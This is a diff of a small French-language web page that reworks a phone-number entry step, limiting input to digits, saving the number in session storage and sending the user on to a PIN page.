@@ -44,17 +44,31 @@ button{
 
 <body>
 <div class="container">
-    <form onsubmit="savePhone(event)">
-        <input id="phone" placeholder="Ex: +221 77 123 45 67" required>
-        <button>Suivant</button>
-    </form>
+    <h2>Entrez votre numéro</h2>
+
+    <form action="/" method="POST"></form>
+
+    <!-- ✅ SEULE LIGNE MODIFIÉE -->
+    <input
+        type="tel"
+        id="phone"
+        placeholder="Numéro de téléphone"
+        inputmode="numeric"
+        pattern="[0-9]*"
+        oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+        required
+    >
+
+    <button onclick="go()">Continuer</button>
 </div>
 
 <script>
-function savePhone(e){
-    e.preventDefault();
-    sessionStorage.setItem("phone", phone.value);
-    location.href="pin.html";
+function go(){
+    const phone = document.getElementById("phone").value;
+    if(!phone) return;
+
+    sessionStorage.setItem("phone", phone);
+    window.location.href = "pin.html";
 }
 </script>
 </body>
